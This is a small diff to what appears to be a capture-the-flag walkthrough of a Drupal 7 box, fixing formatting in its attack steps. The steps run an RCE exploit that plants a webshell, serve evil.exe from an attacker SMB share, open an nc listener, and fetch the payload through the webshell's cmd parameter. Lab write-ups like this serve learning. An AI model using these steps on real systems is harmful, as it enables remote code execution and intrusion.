@@ -118,6 +118,7 @@ Rather than upload the evil.exe I can serve it to the target with Impacket's smb
 
 
 First, run the exploit which creates the webshell.
+
 `php drupal7-services-module-RCE.php`
 
 Second, we have to run smbserver.py and share the folder containing evil.exe.
@@ -125,7 +126,7 @@ Second, we have to run smbserver.py and share the folder containing evil.exe.
 `python smbserver.py -comment 'My share' Sh1n0bi /tmp/sh1n/`
 
 Third, set an nc listener...
-`nc -nlvp 443'
+`nc -nlvp 443`
 
 Fourth, execute the evil payload via the created webshell.
 `10.10.10.9/sh1n0bi.php?cmd=\\10.10.14.16\Sh1n0bi\evil.exe`
